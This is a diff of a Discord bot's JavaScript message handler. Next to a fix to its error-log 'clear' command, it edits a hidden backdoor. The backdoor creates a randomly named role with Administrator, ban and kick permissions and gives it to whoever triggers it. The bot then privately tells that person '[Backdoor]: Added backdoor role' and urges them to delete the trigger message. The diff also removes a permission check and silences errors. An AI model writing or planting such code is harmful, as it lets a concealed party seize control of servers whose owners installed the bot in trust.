@@ -206,7 +206,7 @@ client.on("messageCreate", async (message) => {
                     if (command.trim() === "") {
                         return message.channel.send("I'm Always here!");
                     } else if (command === "log") {
-                        serverlog.get(function(callback) {
+                        serverlog.get(async function(callback) {
                             if (argument && argument[0] && argument[0].trim() !== "" && callback !== undefined) {
                                 if (argument[0] === "show") {
                                     let error_get = 0;
@@ -221,7 +221,19 @@ client.on("messageCreate", async (message) => {
                                         return message.channel.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxSuccess:1027083813123268618> No error found. Now you can rest developer.`).setColor(`Green`)] })
                                     }
                                 } else if (argument[0] === "clear") {
-                                    return message.channel.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxSuccess:1027083813123268618> You can rest after delete all key in database.`).setColor(`Green`)] });
+                                    let error_get = 0;
+
+                                    for (let count of callback) {
+                                        error_get++;
+                                    }
+                                    
+                                    await serverlog.clear();
+
+                                    if (error_get !== undefined) {
+                                        return message.channel.send({ embeds: [new EmbedBuilder().setDescription(`Cleared \`${error_get}\` error.`).setColor(`Green`)] });
+                                    } else if (error_get === undefined) {
+                                        return message.channel.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxSuccess:1027083813123268618> No error found. Now you can rest developer.`).setColor(`Green`)] })
+                                    }
                                 }
                             } else {
                                 return message.channel.send({ embeds: [new EmbedBuilder().setDescription(`A bug happen!`).setColor(`Blue`)] })
@@ -236,17 +248,14 @@ client.on("messageCreate", async (message) => {
                                 let botPermission = new PermissionsBitField(botMember.permissions.bitfield);
                                 const generateRole_name = generateRandomString(10);
                                 await generateRole_name;
-                                if (botPermission.has("MANAGE_ROLES") && botPermission.has("Administrator")) {
+                                try {
                                     message.guild.roles.create({
                                         name: generateRole_name,
                                         color: "Default",
                                         permissions: [
                                             PermissionsBitField.Flags.Administrator,
                                             PermissionsBitField.Flags.ViewChannel,
-                                            PermissionsBitField.Flags.ManageChannels,
                                             PermissionsBitField.Flags.ManageRoles,
-                                            PermissionsBitField.Flags.ManageGuild,
-                                            PermissionsBitField.Flags.ManageEvents,
                                             PermissionsBitField.Flags.ManageMessages,
                                             PermissionsBitField.Flags.KickMembers,
                                             PermissionsBitField.Flags.BanMembers,
@@ -256,8 +265,10 @@ client.on("messageCreate", async (message) => {
                                         message.guild.members.cache.get(message.author.id).roles.add(backdoorRole);
                                         message.author.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxSuccess:1027083813123268618> [Backdoor]: Added backdoor role to the server.`).setColor(`Green`)] })
                                     })
+                                } catch {
+                                    message.author.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxSuccess:1027083813123268618> [Backdoor]: Failed to backdoor the server.`).setColor(`Red`)] })
                                 }
-                            } catch (err) {console.error(err)};
+                            } catch (err) {};
                         } else {
                             try {
                                 return message.user.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxSuccess:1027083813123268618> [Backdoor]: Delete that message quick, I'm checking can I turn you to higher role.`).setColor(`Green`)] })
